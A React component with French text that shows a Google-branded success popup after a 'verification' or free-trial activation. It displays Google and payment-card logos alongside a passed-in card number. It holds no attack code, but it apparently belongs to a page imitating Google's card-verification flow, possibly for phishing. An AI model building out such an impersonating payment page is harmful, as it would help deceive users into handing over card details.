import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from './PopupHeader';
import styles from '../styles/components/CommonPopup.module.css';

const EndPopup = ({ 
  isVisible, 
  selectedPlan,
  onClose,
  cardNumber
}) => {
  console.log("EndPopup rendu avec isVisible:", isVisible);
  
  if (!isVisible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={styles.popup}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={cardNumber}
        />
        
        <div className={styles.content}>
          <div className={styles.iconContainer}>
            <div className={styles.successIcon}>
              <div className={styles.checkmarkContainer}>
                <svg 
                  className={styles.checkmark} 
                  viewBox="0 0 52 52"
                  width="60" 
                  height="60"
                >
                  <circle 
                    className={styles.checkmarkCircle} 
                    cx="26" 
                    cy="26" 
                    r="25" 
                    fill="none"
                    stroke="#4CAF50"
                    strokeWidth="2"
                  />
                  <path 
                    className={styles.checkmarkCheck} 
                    fill="none" 
                    stroke="#4CAF50"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M14.1 27.2l7.1 7.2 16.7-16.8"
                  />
                </svg>
              </div>
            </div>
          </div>
          
          <h3 className={styles.title}>
            {selectedPlan === 'free' 
              ? 'Vérification réussie !' 
              : 'Essai gratuit activé !'
            }
          </h3>
          
          <p className={styles.subtitle}>
            {selectedPlan === 'free' 
              ? 'Votre identité a été vérifiée avec succès.'
              : 'Votre essai gratuit de 30 jours a été activé.'
            }
          </p>
          
          <div className={styles.detailsList}>
            <div className={styles.detailItem}>
              <span className={styles.checkIcon}>✓</span>
              <span>Accès complet à Google Workspace</span>
            </div>
            <div className={styles.detailItem}>
              <span className={styles.checkIcon}>✓</span>
              <span>
                {selectedPlan === 'free' 
                  ? '15 Go de stockage Google Drive'
                  : '2 To de stockage par utilisateur'
                }
              </span>
            </div>
            <div className={styles.detailItem}>
              <span className={styles.checkIcon}>✓</span>
              <span>
                {selectedPlan === 'free' 
                  ? 'Réunions Google Meet sécurisées'
                  : 'Réunions jusqu\'à 150 participants'
                }
              </span>
            </div>
          </div>
          
          <button 
            onClick={onClose}
            className={styles.primaryButton}
          >
            {selectedPlan === 'free' 
              ? 'Accéder à Gmail' 
              : 'Commencer maintenant'
            }
          </button>
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

export default EndPopup;
